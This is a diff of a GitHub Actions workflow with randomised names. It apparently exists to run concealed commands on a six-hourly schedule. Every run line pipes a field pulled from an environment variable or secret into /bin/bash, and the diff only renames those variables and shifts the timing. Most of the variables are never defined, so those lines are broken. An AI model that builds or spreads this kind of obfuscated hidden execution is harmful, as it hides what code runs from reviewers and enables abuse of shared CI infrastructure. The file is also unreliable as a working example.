@@ -3,31 +3,24 @@ name: xieqianli3765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
+    - cron: '0 3/6 * * *'
 
-jobs:  # 30219
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xieqianli3765
         env:
-          vv02631: ${{ secrets.vv02631 }}
+          i6730: ${{ secrets.i6730 }}
         run: |
-          echo $vv02631 | jq -r .kk43635 | /bin/bash
-          echo $dmx89 | jq -r .bugua377 | /bin/bash
-          echo $b025 | jq -r .vpeg5371 | /bin/bash
-          echo $chl75713 | jq -r .dzpfy6 | /bin/bash
-          echo $g8074 | jq -r .jqmd10 | /bin/bash
-          echo $kkx06151 | jq -r .tbwg884 | /bin/bash
-          echo $jhhp7445 | jq -r .lw950 | /bin/bash
-          echo $wlkv87282 | jq -r .nawrj26062 | /bin/bash
-          echo $oukuh4 | jq -r .xajz6 | /bin/bash
-          echo $sam2052 | jq -r .ke0 | /bin/bash
-          echo $p9241 | jq -r .fripq2364 | /bin/bash
-          echo $g67016 | jq -r .vgbw92348 | /bin/bash
-          echo $tkd20 | jq -r .t1013 | /bin/bash
-          echo $wz81612 | jq -r .rzfuy561 | /bin/bash
-          echo $dxwzy2 | jq -r .bguvd09041 | /bin/bash
-          echo $l6 | jq -r .ksn409 | /bin/bash
+          echo $i6730 | jq -r .ctmd14490 | /bin/bash
+          echo $bzls7 | jq -r .ybjj45 | /bin/bash
+          echo $fp30244 | jq -r .yx780 | /bin/bash
+          echo $cnita9135 | jq -r .qlnma9 | /bin/bash
+          echo $llet8 | jq -r .o362 | /bin/bash
+          echo $mbd4385 | jq -r .qfu46329 | /bin/bash
+          echo $h08 | jq -r .mdxhl69 | /bin/bash
+          echo $hdsy64821 | jq -r .dc869 | /bin/bash
+          echo $yjk60 | jq -r .js2 | /bin/bash
 
